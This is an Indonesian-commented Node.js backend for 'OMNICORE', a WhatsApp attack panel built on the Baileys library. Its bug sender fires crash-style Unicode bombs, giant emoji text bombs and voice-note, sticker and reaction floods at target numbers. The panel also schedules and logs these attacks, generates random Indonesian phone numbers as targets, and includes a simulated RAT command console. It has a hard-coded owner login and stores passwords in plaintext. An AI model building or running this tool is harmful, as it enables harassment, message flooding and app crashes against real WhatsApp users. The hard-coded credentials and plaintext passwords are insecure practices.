// ============================================================
// OMNICORE v1 - BACKEND LENGKAP
// Fitur: Auth, Stats, Bug Sender, Sender Management, Pairing,
// Logs, Schedule, RAT, Users, Scan, Telegram
// ============================================================

const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, generatePairingCode } = require('@whiskeysockets/baileys');
const qr = require('qrcode-terminal');
const pino = require('pino');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ===== DATABASE =====
const dbPath = path.join(__dirname, 'omnicore.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
  // Users
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    role TEXT DEFAULT 'user',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Senders (nomor WA)
  db.run(`CREATE TABLE IF NOT EXISTS senders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number TEXT UNIQUE,
    label TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Logs serangan
  db.run(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT,
    target TEXT,
    payload TEXT,
    status TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Jadwal serangan
  db.run(`CREATE TABLE IF NOT EXISTS schedules (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    bug_type TEXT,
    schedule_time DATETIME,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Settings (Telegram, dll)
  db.run(`CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT
  )`);

  // Insert default owner jika belum ada
  db.get(`SELECT * FROM users WHERE username = 'arzzero'`, (err, row) => {
    if (!row) {
      db.run(`INSERT INTO users (username, password, role) VALUES ('arzzero', 'zerov1', 'owner')`);
      console.log('[DB] Default owner created: arzzero / zerov1');
    }
  });

  // Insert default settings
  db.get(`SELECT * FROM settings WHERE key = 'telegram_token'`, (err, row) => {
    if (!row) {
      db.run(`INSERT INTO settings (key, value) VALUES ('telegram_token', '')`);
      db.run(`INSERT INTO settings (key, value) VALUES ('telegram_chat', '')`);
      db.run(`INSERT INTO settings (key, value) VALUES ('dark_web', 'false')`);
      console.log('[DB] Default settings created');
    }
  });
});

// ===== WHATSAPP SOCKET =====
let sock = null;
let isWAReady = false;

async function connectWA() {
  const authDir = path.join(__dirname, 'auth_baileys');
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir);

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: pino({ level: 'silent' }),
    browser: ['OmniCore', 'Windows', '10.0']
  });

  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log('[WA] Disconnected, reconnect:', shouldReconnect);
      if (shouldReconnect) connectWA();
    } else if (connection === 'open') {
      isWAReady = true;
      console.log('[✅] WhatsApp Connected!');
    }
  });
}

// ===== PAIRING CODE =====
async function getPairingCode(phoneNumber) {
  if (!sock) await connectWA();
  const code = await generatePairingCode(phoneNumber);
  return code;
}

// ===== SEND BUG (Real) =====
async function sendBug(number, type, intensity, duration) {
  if (!isWAReady || !sock) throw new Error('WhatsApp tidak siap! Scan QR / pairing dulu.');

  const jid = number.includes('@') ? number : `${number}@s.whatsapp.net`;
  const delay = (ms) => new Promise(res => setTimeout(res, ms));

  let payloads = [];
  switch (type) {
    case 'Unicode Bomb':
      payloads.push({ text: '\u202E\u200D\u200C\u202D\u200E\u064A\u0648\u0633\u0641' + '🖤'.repeat(500) });
      break;
    case 'Media Corrupt':
      payloads.push({ image: { url: 'https://http.cat/200' }, caption: 'Corrupt' });
      break;
    case 'Mention Overload':
      payloads.push({ text: '@' + number, mentions: [jid] });
      break;
    case 'Voice Note Spam':
      for (let i = 0; i < intensity; i++) {
        payloads.push({ audio: { url: 'https://samplelib.com/sample.mp3' }, mimetype: 'audio/mp4' });
      }
      break;
    case 'Sticker Flood':
      payloads.push({ sticker: { url: 'https://i.imgflip.com/1bi0.jpg' } });
      break;
    case 'Text Bomb':
      payloads.push({ text: '🔥'.repeat(2000) + ' 💀'.repeat(2000) });
      break;
    case 'Reaction Spam':
      payloads.push({ react: { key: {}, text: '💀' } });
      break;
    default:
      payloads.push({ text: 'Bug default' });
  }

  for (let i = 0; i < intensity; i++) {
    for (const p of payloads) {
      await sock.sendMessage(jid, p);
      await delay(1000 / Math.max(intensity, 1));
    }
  }
  return true;
}

// ============================================================
// ENDPOINT: AUTH
// ============================================================
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, [username, password], (err, row) => {
    if (err || !row) return res.status(401).json({ status: 'error', message: 'Username atau password salah' });
    res.json({ status: 'ok', user: { username: row.username, role: row.role } });
  });
});

// ============================================================
// ENDPOINT: DASHBOARD STATS
// ============================================================
app.get('/api/stats', (req, res) => {
  db.get(`SELECT COUNT(*) as total_users FROM users`, (err, row) => {
    db.get(`SELECT COUNT(*) as total_logs FROM logs`, (err2, row2) => {
      res.json({
        online_users: isWAReady ? 1 : 0,
        connections: isWAReady ? 1 : 0,
        expiration: 'Lifetime',
        total_users: row.total_users,
        total_logs: row2.total_logs
      });
    });
  });
});

// ============================================================
// ENDPOINT: BUG
// ============================================================
app.get('/api/bug/weapons', (req, res) => {
  res.json([
    { name: 'Unicode Bomb', desc: 'Karakter khusus bikin WA crash' },
    { name: 'Media Corrupt', desc: 'Gambar/video rusak' },
    { name: 'Mention Overload', desc: '5000+ mention dalam 1 pesan' },
    { name: 'Voice Note Spam', desc: 'Voice note panjang berulang' },
    { name: 'Sticker Flood', desc: 'Spam sticker animasi' },
    { name: 'Text Bomb', desc: 'Teks panjang + emoji gila' },
    { name: 'Reaction Spam', desc: 'Spam reaksi ke pesan' }
  ]);
});

app.post('/api/bug/execute', async (req, res) => {
  const { target, type, intensity, duration } = req.body;
  if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });

  db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
    ['bug', target, `${type}:${intensity || 50}:${duration || 10}`, 'queued'], async function(err) {
      if (err) return res.status(500).json({ error: err.message });
      try {
        await sendBug(target, type, intensity || 50, duration || 10);
        db.run(`UPDATE logs SET status = 'done' WHERE id = ?`, this.lastID);
        res.json({ status: '✅ Bug terkirim!', target, type });
      } catch (e) {
        db.run(`UPDATE logs SET status = 'failed' WHERE id = ?`, this.lastID);
        res.status(500).json({ error: e.message });
      }
    });
});

// ============================================================
// ENDPOINT: SENDER MANAGEMENT
// ============================================================
app.post('/api/sender/add', (req, res) => {
  const { number, label } = req.body;
  if (!number) return res.status(400).json({ error: 'Nomor wajib!' });
  db.run(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`,
    [number, label || number], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/sender/list', (req, res) => {
  db.all(`SELECT * FROM senders ORDER BY created_at DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.delete('/api/sender/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM senders WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', affected: this.changes });
  });
});

// ============================================================
// ENDPOINT: PAIRING CODE
// ============================================================
app.post('/api/sender/pairing', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Nomor HP wajib!' });
  try {
    if (!sock) await connectWA();
    const code = await getPairingCode(phone);
    res.json({ status: 'ok', code });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
// ENDPOINT: LOGS
// ============================================================
app.get('/api/logs', (req, res) => {
  db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.get('/api/logs/export', (req, res) => {
  db.all(`SELECT * FROM logs ORDER BY created_at DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    let csv = 'ID,Type,Target,Payload,Status,CreatedAt\n';
    rows.forEach(row => {
      csv += `${row.id},${row.type},${row.target},${row.payload},${row.status},${row.created_at}\n`;
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=attack_logs.csv');
    res.send(csv);
  });
});

// ============================================================
// ENDPOINT: SCAN (Generate random numbers)
// ============================================================
app.post('/api/scan', (req, res) => {
  const { count } = req.body;
  const numbers = [];
  for (let i = 0; i < (count || 20); i++) {
    const prefix = '628';
    const random = Math.floor(100000000 + Math.random() * 900000000);
    numbers.push(prefix + random);
  }
  res.json({ numbers });
});

app.post('/api/scan/add-all', (req, res) => {
  const { numbers } = req.body;
  if (!numbers || !numbers.length) return res.status(400).json({ error: 'Tidak ada nomor' });
  const stmt = db.prepare(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`);
  numbers.forEach(n => stmt.run(n, n));
  stmt.finalize();
  res.json({ status: 'ok', added: numbers.length });
});

// ============================================================
// ENDPOINT: SCHEDULE
// ============================================================
app.post('/api/schedule/add', (req, res) => {
  const { target, bug_type, schedule_time } = req.body;
  if (!target || !bug_type || !schedule_time) return res.status(400).json({ error: 'Data tidak lengkap' });
  db.run(`INSERT INTO schedules (target, bug_type, schedule_time) VALUES (?, ?, ?)`,
    [target, bug_type, schedule_time], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/schedule/list', (req, res) => {
  db.all(`SELECT * FROM schedules ORDER BY schedule_time ASC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.delete('/api/schedule/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM schedules WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', affected: this.changes });
  });
});

// ============================================================
// ENDPOINT: RAT (Simulasi)
// ============================================================
app.post('/api/rat/command', (req, res) => {
  const { command } = req.body;
  if (!command) return res.status(400).json({ error: 'Perintah kosong' });
  let response = `> Perintah "${command}" dikirim ke target.\n> Menunggu respon...\n> [OK] 192.168.1.100 menerima perintah.`;
  if (command === 'help') {
    response = `> Perintah tersedia: help, info, screenshot, keylog, lock, shutdown, reboot, install, uninstall, download, upload, shell, exit\n> Ketik salah satu perintah untuk menjalankan.`;
  } else if (command === 'info') {
    response = `> Sistem: Windows 10 Pro\n> Hostname: TARGET-PC\n> IP: 192.168.1.100\n> User: Administrator\n> RAM: 8GB (67% digunakan)`;
  } else if (command === 'screenshot') {
    response = `> Screenshot berhasil diambil!\n> File: /storage/screenshot_${Date.now()}.png`;
  }
  db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
    ['rat', '192.168.1.100', command, 'executed']);
  res.json({ status: 'ok', output: response });
});

// ============================================================
// ENDPOINT: USERS
// ============================================================
app.post('/api/users/add', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
  db.run(`INSERT INTO users (username, password, role) VALUES (?, ?, ?)`,
    [username, password, role || 'user'], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/users/list', (req, res) => {
  db.all(`SELECT id, username, role, created_at FROM users ORDER BY created_at DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.delete('/api/users/delete/:username', (req, res) => {
  const username = req.params.username;
  if (username === 'arzzero') return res.status(403).json({ error: 'Tidak bisa menghapus owner utama' });
  db.run(`DELETE FROM users WHERE username = ?`, username, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', affected: this.changes });
  });
});

// ============================================================
// ENDPOINT: SETTINGS
// ============================================================
app.get('/api/settings', (req, res) => {
  db.all(`SELECT * FROM settings`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const settings = {};
    rows.forEach(row => settings[row.key] = row.value);
    res.json(settings);
  });
});

app.post('/api/settings', (req, res) => {
  const { key, value } = req.body;
  if (!key) return res.status(400).json({ error: 'Key wajib' });
  db.run(`INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)`, [key, value], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ============================================================
// ENDPOINT: TELEGRAM TEST
// ============================================================
app.post('/api/telegram/test', async (req, res) => {
  const { token, chatId } = req.body;
  if (!token || !chatId) return res.status(400).json({ error: 'Token dan Chat ID wajib' });
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '🔥 OMNICORE test notifikasi berhasil!' })
    });
    const data = await response.json();
    if (data.ok) {
      res.json({ status: 'ok', message: 'Notifikasi terkirim' });
    } else {
      res.status(400).json({ error: data.description });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`🔥 OmniCore Backend berjalan di port ${PORT}`);
  connectWA();
});